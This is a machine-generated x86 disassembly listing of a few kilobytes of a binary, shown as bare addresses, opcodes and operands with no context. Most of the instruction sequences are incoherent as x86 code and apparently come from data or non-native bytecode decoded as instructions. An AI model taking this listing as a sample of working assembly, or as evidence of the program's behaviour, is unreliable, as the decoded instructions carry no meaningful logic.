  402d92:	sub    eax,DWORD PTR [esi+0x11]
  402d95:	push   es
  402d96:	jb     0x402d6f
  402d98:	add    al,0x0
  402d9a:	jo     0x402e0b
  402d9c:	push   ebx
  402d9d:	add    BYTE PTR [eax],al
  402d9f:	or     ah,BYTE PTR [esi]
  402da1:	adc    DWORD PTR [esi],eax
  402da3:	adc    DWORD PTR ds:0x3f6f,eax
  402da9:	or     ch,BYTE PTR [edi+0x40]
  402dac:	add    BYTE PTR [eax],al
  402dae:	or     ch,BYTE PTR [edi+0x53]
  402db1:	add    BYTE PTR [eax],al
  402db3:	or     ah,BYTE PTR [esi]
  402db5:	adc    DWORD PTR [esi],eax
  402db7:	jb     0x402d9e
  402db9:	add    al,0x0
  402dbb:	jo     0x402e2c
  402dbd:	push   ebx
  402dbe:	add    BYTE PTR [eax],al
  402dc0:	or     ah,BYTE PTR [esi]
  402dc2:	adc    DWORD PTR [esi],eax
  402dc4:	adc    DWORD PTR ds:0x416f,eax
  402dca:	or     ch,BYTE PTR [edi+0x53]
  402dcd:	add    BYTE PTR [eax],al
  402dcf:	or     ah,BYTE PTR [esi]
  402dd1:	adc    DWORD PTR ds:0x4f6f,eax
  402dd7:	or     dl,BYTE PTR [ebx]
  402dd9:	add    eax,0xb62d0511
  402dde:	jb     0x402dcb
  402de0:	add    al,0x0
  402de2:	jo     0x402dfc
  402de4:	lea    eax,[ecx]
  402de6:	add    BYTE PTR [eax],al
  402de8:	add    DWORD PTR [ebx],edx
  402dea:	or     dl,BYTE PTR [ecx]
  402dec:	or     dl,BYTE PTR [esi]
  402dee:	adc    DWORD PTR [edi+ebp*2],eax
  402df1:	dec    edi
  402df2:	add    BYTE PTR [eax],al
  402df4:	or     ch,BYTE PTR [edi+0x3f]
  402df7:	add    BYTE PTR [eax],al
  402df9:	or     ch,BYTE PTR [edi+0x40]
  402dfc:	add    BYTE PTR [eax],al
  402dfe:	or     ah,BYTE PTR [edx+0x11170a11]
  402e04:	push   es
  402e05:	outs   dx,DWORD PTR ds:[esi]
  402e06:	push   esp
  402e07:	add    BYTE PTR [eax],al
  402e09:	or     ah,BYTE PTR [edx+0xd280a11]
  402e0f:	add    BYTE PTR [eax],al
  402e11:	push   es
  402e12:	add    ch,BYTE PTR [eax]
  402e14:	adc    al,0x0
  402e16:	add    BYTE PTR [esi],al
  402e18:	frstor ds:0x3000001
  402e1e:	sub    BYTE PTR [edi],ah
  402e20:	add    BYTE PTR [eax],al
  402e22:	push   es
  402e23:	add    al,0x2c
  402e25:	or     BYTE PTR [ebx],al
  402e27:	add    al,0x2
  402e29:	sub    BYTE PTR [ebx],ah
  402e2b:	add    BYTE PTR [eax],al
  402e2d:	push   es
  402e2e:	fisttp QWORD PTR [edi]
  402e30:	add    DWORD PTR [eax],eax
  402e32:	add    BYTE PTR [ebx],dl
  402e34:	pop    es
  402e35:	jb     0x402e3e
  402e37:	add    eax,0x8d177000
  402e3c:	add    DWORD PTR [eax],eax
  402e3e:	add    BYTE PTR [ecx],al
  402e40:	adc    ecx,DWORD PTR [ebx]
  402e42:	adc    DWORD PTR [ebx],ecx
  402e44:	push   ss
  402e45:	add    esp,DWORD PTR [edx+0xd280b11]
  402e4b:	add    BYTE PTR [eax],al
  402e4d:	push   es
  402e4e:	add    ebp,DWORD PTR [eax]
  402e50:	adc    al,0x0
  402e52:	add    BYTE PTR [esi],al
  402e54:	adc    DWORD PTR [edi],eax
  402e56:	outs   dx,DWORD PTR ds:[esi]
  402e57:	inc    ecx
  402e58:	add    BYTE PTR [eax],al
  402e5a:	or     ch,BYTE PTR [esi*1+0x4eb72]
  402e61:	jo     0x402e7b
  402e63:	lea    eax,[ecx]
  402e65:	add    BYTE PTR [eax],al
  402e67:	add    DWORD PTR [ebx],edx
  402e69:	or     al,0x11
  402e6b:	or     al,0x16
  402e6d:	adc    DWORD PTR [edi],eax
  402e6f:	outs   dx,DWORD PTR ds:[esi]
  402e70:	aas    
  402e71:	add    BYTE PTR [eax],al
  402e73:	or     ch,BYTE PTR [edi+0x40]
  402e76:	add    BYTE PTR [eax],al
  402e78:	or     ah,BYTE PTR [edx+0x11170c11]
  402e7e:	pop    es
  402e7f:	outs   dx,DWORD PTR ds:[esi]
  402e80:	inc    ecx
  402e81:	add    BYTE PTR [eax],al
  402e83:	or     ah,BYTE PTR [edx+0xd280c11]
  402e89:	add    BYTE PTR [eax],al
  402e8b:	push   es
  402e8c:	add    ebp,DWORD PTR [eax]
  402e8e:	adc    al,0x0
  402e90:	add    BYTE PTR [esi],al
  402e92:	add    ebp,DWORD PTR [eax]
  402e94:	inc    esp
  402e95:	add    BYTE PTR [eax],al
  402e97:	or     ch,BYTE PTR [edi+eax*2]
  402e9a:	jb     0x402eb9
  402e9c:	add    eax,0x8d177000
  402ea1:	add    DWORD PTR [eax],eax
  402ea3:	add    BYTE PTR [ecx],al
  402ea5:	adc    ecx,DWORD PTR ds:0x3160d11
  402eab:	mov    ds:0xd280d11,al
  402eb0:	add    BYTE PTR [eax],al
  402eb2:	push   es
  402eb3:	sub    BYTE PTR [edx],dl
  402eb5:	add    BYTE PTR [eax],al
  402eb7:	push   es
  402eb8:	add    ebp,DWORD PTR [eax]
  402eba:	inc    ebp
  402ebb:	add    BYTE PTR [eax],al
  402ebd:	or     bl,dh
  402ebf:	and    DWORD PTR [esi],esp
  402ec1:	jb     0x402efc
  402ec3:	add    eax,0x8d177000
  402ec8:	add    DWORD PTR [eax],eax
  402eca:	add    BYTE PTR [ecx],al
  402ecc:	adc    ecx,DWORD PTR [esi]
  402ece:	adc    DWORD PTR [esi],ecx
  402ed0:	push   ss
  402ed1:	add    esp,DWORD PTR [edx+0xd280e11]
  402ed7:	add    BYTE PTR [eax],al
  402ed9:	push   es
  402eda:	sub    BYTE PTR [edx],dl
  402edc:	add    BYTE PTR [eax],al
  402ede:	push   es
  402edf:	fiadd  WORD PTR [eax]
  402ee1:	ficomp WORD PTR [edi+0x13]
  402ee4:	or     BYTE PTR [edx+0x67],dh
  402ee7:	add    eax,0x8d177000
  402eec:	add    DWORD PTR [eax],eax
  402eee:	add    BYTE PTR [ecx],al
  402ef0:	adc    ecx,DWORD PTR [edi]
  402ef2:	adc    DWORD PTR [edi],ecx
  402ef4:	push   ss
  402ef5:	add    esp,DWORD PTR [edx+0xd280f11]
  402efb:	add    BYTE PTR [eax],al
  402efd:	push   es
  402efe:	sub    BYTE PTR [edx],dl
  402f00:	add    BYTE PTR [eax],al
  402f02:	push   es
  402f03:	adc    DWORD PTR [eax],ecx
  402f05:	outs   dx,DWORD PTR ds:[esi]
  402f06:	inc    ecx
  402f07:	add    BYTE PTR [eax],al
  402f09:	or     ch,BYTE PTR [esp+esi*1]
  402f0c:	jb     0x402ef9
  402f0e:	add    al,0x0
  402f10:	jo     0x402f2a
  402f12:	lea    eax,[ecx]
  402f14:	add    BYTE PTR [eax],al
  402f16:	add    DWORD PTR [ebx],edx
  402f18:	adc    BYTE PTR [ecx],dl
  402f1a:	adc    BYTE PTR [esi],dl
  402f1c:	adc    DWORD PTR [eax],ecx
  402f1e:	outs   dx,DWORD PTR ds:[esi]
  402f1f:	aas    
  402f20:	add    BYTE PTR [eax],al
  402f22:	or     ch,BYTE PTR [edi+0x40]
  402f25:	add    BYTE PTR [eax],al
  402f27:	or     ah,BYTE PTR [edx+0x11171011]
  402f2d:	or     BYTE PTR [edi+0x41],ch
  402f30:	add    BYTE PTR [eax],al
  402f32:	or     ah,BYTE PTR [edx+0xd281011]
  402f38:	add    BYTE PTR [eax],al
  402f3a:	push   es
  402f3b:	sub    BYTE PTR [edx],dl
  402f3d:	add    BYTE PTR [eax],al
  402f3f:	push   es
  402f40:	fiadd  WORD PTR [eax]
  402f42:	sub    al,BYTE PTR [eax]
  402f44:	add    DWORD PTR [eax+0x0],ebx
  402f47:	add    BYTE PTR [eax],al
  402f49:	add    BYTE PTR [eax+eax*1],dl
  402f4c:	popa   
  402f4d:	jne    0x402f4f
  402f4f:	inc    ebp
  402f50:	cmp    al,0x0
  402f52:	add    BYTE PTR [ecx],al
  402f54:	add    BYTE PTR [eax],al
  402f56:	adc    al,0x0
  402f58:	popa   
  402f59:	mov    edx,0xf2300
  402f5e:	add    BYTE PTR [edx],al
  402f60:	add    BYTE PTR [eax],al
  402f62:	adc    al,0x0
  402f64:	popa   
  402f65:	fld    QWORD PTR [eax]
  402f67:	push   ds
  402f68:	cmp    al,BYTE PTR [eax]
  402f6a:	add    BYTE PTR [ecx],al
  402f6c:	add    BYTE PTR [eax],al
  402f6e:	adc    al,0x0
  402f70:	popa   
  402f71:	sti    
  402f72:	add    dl,cl
  402f74:	add    eax,0x10000
  402f79:	add    BYTE PTR [eax+0x2],ah
  402f7c:	or     BYTE PTR [eax+0x2],ch
  402f7f:	and    DWORD PTR ds:0x10000,eax
  402f85:	add    ch,al
  402f87:	add    DWORD PTR [esi],edx
  402f89:	fild   DWORD PTR [ecx]
  402f8b:	mov    al,0x3d
  402f8d:	add    BYTE PTR [eax],al
  402f8f:	add    DWORD PTR [eax],eax
  402f91:	add    ch,al
  402f93:	add    DWORD PTR [esi],edx
  402f95:	mov    eax,DWORD PTR [edx]
  402f97:	pop    edi
  402f98:	add    eax,0x1b010000
  402f9d:	xor    BYTE PTR [ebx],al
  402f9f:	add    BYTE PTR [eax+eax*1+0x0],bl
  402fa3:	add    BYTE PTR [edx],cl
  402fa5:	add    BYTE PTR [eax],al
  402fa7:	adc    DWORD PTR [edx+ecx*1],edx
  402faa:	jle    0x402f39
  402fac:	add    BYTE PTR [eax],al
  402fae:	add    al,0x6f
  402fb0:	push   ebp
  402fb1:	add    BYTE PTR [eax],al
  402fb3:	or     cl,BYTE PTR [ebx+ebp*1]
  402fb6:	xor    dl,BYTE PTR [edx]
  402fb8:	add    ch,BYTE PTR [eax]
  402fba:	push   esi
  402fbb:	add    BYTE PTR [eax],al
  402fbd:	or     cl,BYTE PTR [ebx]
  402fbf:	pop    es
  402fc0:	outs   dx,DWORD PTR ds:[esi]
  402fc1:	push   edi
  402fc2:	add    BYTE PTR [eax],al
  402fc4:	or     al,BYTE PTR [ebx]
  402fc6:	outs   dx,DWORD PTR ds:[esi]
  402fc7:	pop    eax
  402fc8:	add    BYTE PTR [eax],al
  402fca:	or     bl,BYTE PTR [ebx]
  402fcc:	sub    BYTE PTR [ecx+0x0],bl
  402fcf:	add    BYTE PTR [edx],cl
  402fd1:	sub    al,0x16
  402fd3:	pop    es
  402fd4:	outs   dx,DWORD PTR ds:[esi]
  402fd5:	pop    edx
  402fd6:	add    BYTE PTR [eax],al
  402fd8:	or     ch,BYTE PTR [esi+ecx*1]
  402fdb:	pop    es
  402fdc:	outs   dx,DWORD PTR ds:[esi]
  402fdd:	pop    edx
  402fde:	add    BYTE PTR [eax],al
  402fe0:	or     ch,BYTE PTR [eax]
  402fe2:	pop    ebx
  402fe3:	add    BYTE PTR [eax],al
  402fe5:	or     cl,BYTE PTR [edx]
  402fe7:	sub    ecx,DWORD PTR [ecx]
  402fe9:	adc    al,BYTE PTR [edx]
  402feb:	sub    BYTE PTR [eax+eax*1+0x0],bl
  402fef:	or     ch,BYTE PTR ds:0x120edec5
  402ff5:	add    bh,dh
  402ff7:	push   ss
  402ff8:	add    al,BYTE PTR [eax]
  402ffa:	add    BYTE PTR [ebx],bl
  402ffc:	outs   dx,DWORD PTR ds:[esi]
  402ffd:	pop    ebp
  402ffe:	add    BYTE PTR [eax],al
  403000:	or     bl,ah
  403002:	push   es
  403003:	sub    al,BYTE PTR [ecx]
  403005:	adc    BYTE PTR [eax],al
  403007:	add    BYTE PTR [edx],al
  403009:	add    BYTE PTR ds:0x4c3f00,cl
  40300f:	push   cs
  403010:	add    BYTE PTR [eax],al
  403012:	add    BYTE PTR [eax],al
  403014:	sbb    esi,DWORD PTR [eax]
  403016:	push   es
  403017:	add    dl,dh
  403019:	add    DWORD PTR [eax],eax
  40301b:	add    BYTE PTR [ebx],cl
  40301d:	add    BYTE PTR [eax],al
  40301f:	adc    DWORD PTR [ebx],eax
  403021:	outs   dx,DWORD PTR ds:[esi]
  403022:	add    BYTE PTR cs:[eax],al
  403025:	push   es
  403026:	sub    BYTE PTR [esi+0x0],bl
  403029:	add    BYTE PTR [edx],cl
  40302b:	or     al,BYTE PTR [edx]
  40302d:	push   ss
  40302e:	add    bl,BYTE PTR [edi]
  403030:	outs   dx,DWORD PTR cs:[esi]
  403032:	inc    esi
  403033:	add    BYTE PTR [eax],al
  403035:	or     ch,BYTE PTR [edi+0x24]
  403038:	add    BYTE PTR [eax],al
  40303a:	or     cl,BYTE PTR [ebx]
  40303c:	pop    es
  40303d:	sbb    DWORD PTR [ebp+0x1000042],ecx
  403043:	adc    ecx,DWORD PTR [edi]
  403045:	adc    DWORD PTR [edi],ecx
  403047:	push   ss
  403048:	jle    0x4030a9
  40304a:	add    BYTE PTR [eax],al
  40304c:	or     bl,BYTE PTR [ebp+0x7e170f11]
  403052:	pusha  
  403053:	add    BYTE PTR [eax],al
  403055:	or     bl,BYTE PTR [ebp+0x7e180f11]
  40305b:	popa   
  40305c:	add    BYTE PTR [eax],al
  40305e:	or     bl,BYTE PTR [ebp+0x626f0f11]
  403064:	add    BYTE PTR [eax],al
  403066:	or     cl,BYTE PTR [eax+ecx*1]
  403069:	adc    eax,0x8070a2e
  40306e:	pop    ss
  40306f:	pop    eax
  403070:	outs   dx,DWORD PTR ds:[esi]
  403071:	cmp    BYTE PTR [eax],al
  403073:	add    BYTE PTR [edx],cl
  403075:	or     eax,DWORD PTR [ebx]
  403077:	outs   dx,DWORD PTR ds:[esi]
  403078:	das    
  403079:	add    BYTE PTR [eax],al
  40307b:	push   es
  40307c:	or     eax,0x306f03
  403081:	add    BYTE PTR [esi],al
  403083:	adc    eax,DWORD PTR [ecx+edx*1]
  403086:	add    al,0x2d
  403088:	add    eax,DWORD PTR [edi]
  40308a:	adc    eax,DWORD PTR [ebx+eax*1]
  40308d:	outs   dx,DWORD PTR ds:[esi]
  40308e:	xor    DWORD PTR [eax],eax
  403090:	add    BYTE PTR [esi],al
  403092:	adc    eax,DWORD PTR ds:0x272d0511
  403098:	add    dl,BYTE PTR [esi]
  40309a:	add    bl,BYTE PTR [edi]
  40309c:	outs   dx,DWORD PTR cs:[esi]
  40309e:	inc    esi
  40309f:	add    BYTE PTR [eax],al
  4030a1:	or     ch,BYTE PTR [edi+0x24]
  4030a4:	add    BYTE PTR [eax],al
  4030a6:	or     dl,BYTE PTR [ebx]
  4030a8:	push   es
  4030a9:	adc    DWORD PTR [esi],eax
  4030ab:	pop    ds
  4030ac:	mov    WORD PTR cs:[edx+0x0],es
  4030b0:	add    BYTE PTR [ecx],al
  4030b2:	push   es
  4030b3:	outs   dx,DWORD PTR ds:[esi]
  4030b4:	arpl   WORD PTR [eax],ax
  4030b6:	add    BYTE PTR [edx],cl
  4030b8:	sub    BYTE PTR [eax+eax*1+0x0],ah
  4030bc:	or     dl,BYTE PTR [ebx]
  4030be:	add    eax,0x11071314
  4030c3:	add    al,0x6
  4030c5:	sub    BYTE PTR [ebp+0x0],ah
  4030c8:	add    BYTE PTR [edx],cl
  4030ca:	adc    ecx,DWORD PTR [eax]
  4030cc:	adc    DWORD PTR [eax],ecx
  4030ce:	sub    al,0x4
  4030d0:	adc    DWORD PTR [eax],ecx
  4030d2:	adc    eax,DWORD PTR [ecx+ecx*1]
  4030d5:	sub    BYTE PTR [esi+0x0],ah
  4030d8:	add    BYTE PTR [edx],cl
  4030da:	sub    al,0x17
  4030dc:	jb     0x403069
  4030de:	add    eax,0xe287000
  4030e3:	add    BYTE PTR [eax],al
  4030e5:	push   es
  4030e6:	adc    DWORD PTR [eax+ebp*1],eax
  4030e9:	add    BYTE PTR [bx+si],al
  4030ec:	or     dl,BYTE PTR [ecx]
  4030ee:	add    al,0x13
  4030f0:	or     DWORD PTR [ebx],ebp
  4030f2:	and    DWORD PTR [edx-0x59],esi
  4030f5:	add    eax,0xe287000
  4030fa:	add    BYTE PTR [eax],al
  4030fc:	push   es
  4030fd:	or     DWORD PTR [ecx],edx
  4030ff:	add    al,0x28
  403101:	push   0x90a0000
  403106:	jb     0x4030dd
  403108:	add    eax,0x4117000
  40310d:	sub    BYTE PTR [ecx+0x0],ch
  403110:	add    BYTE PTR [edx],cl
  403112:	adc    ecx,DWORD PTR [ecx]
  403114:	pop    es
  403115:	adc    DWORD PTR [ecx],ecx
  403117:	sbb    ebp,DWORD PTR [edi+0x6a]
  40311a:	add    BYTE PTR [eax],al
  40311c:	or     ch,BYTE PTR ds:0x8d720238
  403122:	add    al,BYTE PTR [eax]
  403124:	jo     0x403141
  403126:	outs   dx,DWORD PTR ds:[esi]
  403127:	imul   eax,DWORD PTR [eax],0x0
  40312a:	or     ch,BYTE PTR [edx+ebp*1]
  40312d:	sub    BYTE PTR [eax+eax*1+0x0],ch
  403131:	or     dh,BYTE PTR [edx-0x27]
  403134:	add    eax,0x8d187000
  403139:	add    DWORD PTR [eax],eax
  40313b:	add    BYTE PTR [ecx],al
  40313d:	adc    edx,DWORD PTR [eax]
  40313f:	adc    DWORD PTR [eax],edx
  403141:	push   ss
  403142:	pop    es
  403143:	mov    ds:0x11171011,al
  403148:	or     DWORD PTR [edx+0xd281011],esp
  40314e:	add    BYTE PTR [eax],al
  403150:	push   es
  403151:	add    al,0x28
  403153:	sbb    DWORD PTR [eax],eax
  403155:	add    BYTE PTR [esi],al
  403157:	jle    0x4030e5
  403159:	add    BYTE PTR [eax],al
  40315b:	add    al,0x11
  40315d:	add    al,0x9
  40315f:	push   es
  403160:	add    ebp,DWORD PTR [edi+0x32]
  403163:	add    BYTE PTR [eax],al
  403165:	push   es
  403166:	adc    al,BYTE PTR [edi]
  403168:	sub    BYTE PTR [ebp+0x0],ch
  40316b:	add    BYTE PTR [edx],cl
  40316d:	adc    ecx,DWORD PTR [edx]
  40316f:	adc    DWORD PTR [edx],ecx
  403171:	outs   dx,DWORD PTR ds:[esi]
  403172:	outs   dx,BYTE PTR ds:[esi]
  403173:	add    BYTE PTR [eax],al
  403175:	or     dh,BYTE PTR [edx+0xf]
  403178:	push   es
  403179:	add    BYTE PTR [eax+0x6f],dh
  40317c:	outs   dx,DWORD PTR ds:[esi]
  40317d:	add    BYTE PTR [eax],al
  40317f:	or     ah,BYTE PTR [esi]
  403181:	jae    0x4031f3
  403183:	add    BYTE PTR [eax],al
  403185:	or     dl,BYTE PTR [ebx]
  403187:	or     edx,DWORD PTR [edi]
  403189:	pop    ss
  40318a:	jae    0x4031fd
  40318c:	add    BYTE PTR [eax],al
  40318e:	or     dl,BYTE PTR [ebx]
  403190:	or     al,0x11
  403192:	add    eax,0x730c1116
  403197:	jb     0x403199
  403199:	add    BYTE PTR [edx],cl
  40319b:	adc    ecx,DWORD PTR ds:0x110a1106
  4031a1:	or     eax,0x736f0b11
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	or     bl,dh
  4031aa:	or     al,0x11
  4031ac:	or     eax,0xd11072c
  4031b1:	outs   dx,DWORD PTR ds:[esi]
  4031b2:	pop    ebp
  4031b3:	add    BYTE PTR [eax],al
  4031b5:	or     bl,ah
  4031b7:	adc    DWORD PTR [edi],eax
  4031b9:	mov    gs,WORD PTR [ecx+0x16]
  4031bc:	xor    DWORD PTR [eax+ebp*1+0x6c],eax
  4031c0:	add    BYTE PTR [eax],al
  4031c2:	or     dl,BYTE PTR [ecx]
  4031c4:	pop    es
  4031c5:	adc    edx,DWORD PTR [ecx]
  4031c7:	push   ss
  4031c8:	adc    edx,DWORD PTR [edx]
  4031ca:	sub    ebp,DWORD PTR ds:0x12111111
  4031d0:	call   0x6:0x25720e13
  4031d7:	jo     0x4031f0
  4031d9:	lea    eax,[ecx]
  4031db:	add    BYTE PTR [eax],al
  4031dd:	add    DWORD PTR [ebx],edx
  4031df:	adc    edx,DWORD PTR [ecx]
  4031e1:	adc    edx,DWORD PTR [esi]
  4031e3:	adc    DWORD PTR [esi],ecx
  4031e5:	mov    ds:0xd281311,al
  4031ea:	add    BYTE PTR [eax],al
  4031ec:	push   es
  4031ed:	add    al,0x28
  4031ef:	adc    al,0x0
  4031f1:	add    BYTE PTR [esi],al
  4031f3:	adc    DWORD PTR [edx],edx
  4031f5:	pop    ss
  4031f6:	pop    eax
  4031f7:	adc    edx,DWORD PTR [edx]
  4031f9:	adc    DWORD PTR [edx],edx
  4031fb:	adc    DWORD PTR [ecx],edx
  4031fd:	mov    gs,WORD PTR [ecx+0x32]
  403200:	retf   
  403201:	sub    dh,BYTE PTR [edx+0x4b]
  403204:	push   es
  403205:	add    BYTE PTR [eax+0x28],dh
  403208:	push   cs
  403209:	add    BYTE PTR [eax],al
  40320b:	push   es
  40320c:	sub    BYTE PTR [eax+eax*1+0x0],dh
  403210:	or     ch,BYTE PTR [edx]
  403212:	add    BYTE PTR [eax],al
  403214:	add    DWORD PTR [eax],edx
  403216:	add    BYTE PTR [eax],al
  403218:	add    al,BYTE PTR [eax]
  40321a:	jge    0x40321d
  40321c:	push   cs
  40321d:	mov    eax,DWORD PTR [ecx]
  40321f:	or     al,0x0
  403221:	add    BYTE PTR [eax],al
  403223:	add    BYTE PTR [ebx],dl
  403225:	xor    BYTE PTR [eax+eax*1],al
  403228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403229:	add    BYTE PTR [eax],al
  40322b:	add    BYTE PTR [eax+eax*1],cl
  40322e:	add    BYTE PTR [ecx],dl
  403230:	add    ch,BYTE PTR [eax]
  403232:	sbb    eax,0xa060000
  403237:	push   es
  403238:	or     eax,0x34509
  40323d:	add    BYTE PTR [eax],al
  40323f:	add    al,BYTE PTR [eax]
  403241:	add    BYTE PTR [eax],al
  403243:	or     al,BYTE PTR [eax]
  403245:	add    BYTE PTR [eax],al
  403247:	dec    esp
  403248:	add    BYTE PTR [eax],al
  40324a:	add    BYTE PTR [ebx],ch
  40324c:	push   esi
  40324d:	add    ch,BYTE PTR [eax]
  40324f:	add    BYTE PTR es:[eax],al
  403252:	push   es
  403253:	sub    ecx,DWORD PTR [esi+0x14]
  403256:	or     edi,DWORD PTR [esi-0x73]
  403259:	add    BYTE PTR [eax],al
  40325b:	add    al,0x2c
  40325d:	adc    eax,DWORD PTR [edx]
  40325f:	jle    0x4031ee
  403261:	add    BYTE PTR [eax],al
  403263:	add    al,0x6f
  403265:	jne    0x403267
  403267:	add    BYTE PTR [edx],cl
  403269:	jae    0x4032e1
  40326b:	add    BYTE PTR [eax],al
  40326d:	or     cl,BYTE PTR [ebx]
  40326f:	sub    eax,DWORD PTR [edi]
  403271:	add    dh,BYTE PTR [ebx+0x77]
  403274:	add    BYTE PTR [eax],al
  403276:	or     cl,BYTE PTR [ebx]
  403278:	add    ebp,DWORD PTR [ebx+edx*1]
  40327b:	add    ch,BYTE PTR [eax]
  40327d:	js     0x40327f
  40327f:	add    BYTE PTR [edx],cl
  403281:	or     al,0x7
  403283:	or     BYTE PTR [eax],ch
  403285:	jns    0x403287
  403287:	add    BYTE PTR [edx],cl
  403289:	outs   dx,DWORD PTR ds:[esi]
  40328a:	jp     0x40328c
  40328c:	add    BYTE PTR [edx],cl
  40328e:	pop    es
  40328f:	add    ch,BYTE PTR [eax]
  403291:	and    eax,0x2b060000
  403296:	or     al,0x2
  403298:	jae    0x403315
  40329a:	add    BYTE PTR [eax],al
  40329c:	or     al,BYTE PTR [edx]
  40329e:	sub    BYTE PTR ds:0x72060000,ah
  4032a4:	pop    ebx
  4032a5:	push   es
  4032a6:	add    BYTE PTR [eax+0x18],dh
  4032a9:	lea    eax,[ecx]
  4032ab:	add    BYTE PTR [eax],al
  4032ad:	add    DWORD PTR [ebx],edx
  4032af:	add    al,0x11
  4032b1:	add    al,0x16
  4032b3:	jle    0x403240
  4032b5:	add    BYTE PTR [eax],al
  4032b7:	add    al,0x6f
  4032b9:	jl     0x4032bb
  4032bb:	add    BYTE PTR [edx],cl
  4032bd:	mov    WORD PTR [ecx],?
  4032bf:	add    BYTE PTR [eax],al
  4032c1:	add    DWORD PTR [edx+0x2170411],esp
  4032c7:	mov    ds:0xd280411,al
  4032cc:	add    BYTE PTR [eax],al
  4032ce:	push   es
  4032cf:	sub    BYTE PTR [eax+eax*1+0x0],dh
  4032d3:	or     ch,BYTE PTR [edx]
  4032d5:	add    BYTE PTR [eax],al
  4032d7:	add    BYTE PTR [ebx],bl
  4032d9:	xor    BYTE PTR [ebx],al
  4032db:	add    BYTE PTR [ebx],bh
  4032dd:	add    BYTE PTR [eax],al
  4032df:	add    BYTE PTR ds:0x2110000,cl
  4032e5:	or     eax,0x7d6f02
  4032ea:	add    BYTE PTR [edx],cl
  4032ec:	or     ch,BYTE PTR [ebx]
  4032ee:	sbb    eax,DWORD PTR [esi]
  4032f0:	outs   dx,DWORD PTR ds:[esi]
  4032f1:	jle    0x4032f3
  4032f3:	add    BYTE PTR [edx],cl
  4032f5:	je     0x403324
  4032f7:	add    BYTE PTR [eax],al
  4032f9:	add    DWORD PTR [ebx],ecx
  4032fb:	push   es
  4032fc:	outs   dx,DWORD PTR ds:[esi]
  4032fd:	jg     0x4032ff
  4032ff:	add    BYTE PTR [edx],cl
  403301:	or     al,0x7
  403303:	or     BYTE PTR [ebx],al
  403305:	sub    BYTE PTR [ecx],dl
  403307:	add    BYTE PTR [eax],al
  403309:	push   es
  40330a:	push   es
  40330b:	outs   dx,DWORD PTR ds:[esi]
  40330c:	add    BYTE PTR [eax],0x0
  40330f:	or     ch,BYTE PTR ds:0x90adedd
  403315:	sub    al,0x6
  403317:	or     DWORD PTR [edi+0x5d],ebp
  40331a:	add    BYTE PTR [eax],al
  40331c:	or     bl,ah
  40331e:	sub    al,BYTE PTR [eax]
  403320:	add    DWORD PTR [eax],edx
  403322:	add    BYTE PTR [eax],al
  403324:	add    al,BYTE PTR [eax]
  403326:	add    al,BYTE PTR [eax]
  403328:	xor    BYTE PTR cs:[eax],al
  40332b:	or     al,BYTE PTR [eax]
  40332d:	add    BYTE PTR [eax],al
  40332f:	add    BYTE PTR [ebx],bl
  403331:	xor    BYTE PTR ds:0x36c00,al
  403337:	add    BYTE PTR [esi],cl
  403339:	add    BYTE PTR [eax],al
  40333b:	adc    DWORD PTR [edx],eax
  40333d:	pop    ss
  40333e:	jae    0x4032c1
  403340:	add    BYTE PTR [eax],al
  403342:	or     dl,BYTE PTR [edi]
  403344:	jae    0x40337a
  403346:	add    BYTE PTR [eax],al
  403348:	push   es
  403349:	or     ah,BYTE PTR [eax]
  40334b:	inc    DWORD PTR [eax]
  40334d:	add    BYTE PTR [eax],al
  40334f:	jae    0x4033a3
  403351:	add    BYTE PTR [eax],al
  403353:	or     cl,BYTE PTR [ebx]
  403355:	and    BYTE PTR [eax],al
  403357:	or     BYTE PTR [eax],al
  403359:	add    BYTE PTR [ebx+0x52],dh
  40335c:	add    BYTE PTR [eax],al
  40335e:	or     cl,BYTE PTR [esi+eax*1]
  403361:	outs   dx,DWORD PTR ds:[esi]
  403362:	add    BYTE PTR [eax],0x0
  403365:	or     cl,BYTE PTR ds:0x32838
  40336b:	add    BYTE PTR [ecx],cl
  40336d:	pop    ds
  40336e:	or     ch,BYTE PTR [esi]
  403370:	add    eax,0x330d1f09
  403375:	or     al,0x6
  403377:	outs   dx,DWORD PTR ds:[esi]
  403378:	add    BYTE PTR [eax],0x0
  40337b:	or     cl,BYTE PTR ds:0x31238
  403381:	add    BYTE PTR [ecx],cl
  403383:	pop    ds
  403384:	and    ebp,DWORD PTR [esi]
  403386:	wbinvd 
  403388:	pop    ds
  403389:	or     DWORD PTR [esi],ebp
  40338b:	or     cl,BYTE PTR [ecx]
  40338d:	pop    ds
  40338e:	and    BYTE PTR [esi],ch
  403390:	add    eax,0x333b1f09
  403395:	adc    eax,DWORD PTR [esi]
  403397:	outs   dx,DWORD PTR ds:[esi]
  403398:	add    DWORD PTR [eax],0x0
  40339b:	or     ah,BYTE PTR [esi]
  40339d:	push   es
  40339e:	outs   dx,DWORD PTR ds:[esi]
  40339f:	add    BYTE PTR [eax],0x0
  4033a2:	or     cl,BYTE PTR ds:0x2eb38
  4033a8:	add    BYTE PTR [ecx],cl
  4033aa:	pop    ds
  4033ab:	pop    ebx
  4033ac:	xor    esp,DWORD PTR [edi+0x6]
  4033af:	outs   dx,DWORD PTR ds:[esi]
  4033b0:	add    DWORD PTR [eax],0x0
  4033b3:	or     dl,BYTE PTR [ebx]
  4033b5:	add    al,0x11
  4033b7:	add    al,0x72
  4033b9:	imul   eax,DWORD PTR [esi],0x366f7000
  4033bf:	add    BYTE PTR [eax],al
  4033c1:	or     ch,BYTE PTR [ebx+ebx*1]
  4033c4:	jb     0x403441
  4033c6:	push   es
  4033c7:	add    BYTE PTR [eax+0x28],dh
  4033ca:	push   cs
  4033cb:	add    BYTE PTR [eax],al
  4033cd:	push   es
  4033ce:	add    al,BYTE PTR [esi]
  4033d0:	outs   dx,DWORD PTR ds:[esi]
  4033d1:	cmp    al,BYTE PTR [eax]
  4033d3:	add    BYTE PTR [esi],al
  4033d5:	pop    ss
  4033d6:	pop    ecx
  4033d7:	pop    ss
  4033d8:	sub    BYTE PTR [ebx],bl
  4033da:	add    BYTE PTR [eax],al
  4033dc:	push   es
  4033dd:	sub    ebp,DWORD PTR [edx]
  4033df:	jb     0x403382
  4033e1:	push   es
  4033e2:	add    BYTE PTR [eax+0x17],dh
  4033e5:	lea    eax,[ecx]
  4033e7:	add    BYTE PTR [eax],al
  4033e9:	add    DWORD PTR [ebx],edx
  4033eb:	or     dl,BYTE PTR [ecx]
  4033ed:	or     dl,BYTE PTR [esi]
  4033ef:	adc    DWORD PTR [edx+eiz*4],eax
  4033f2:	adc    DWORD PTR [edx],ecx
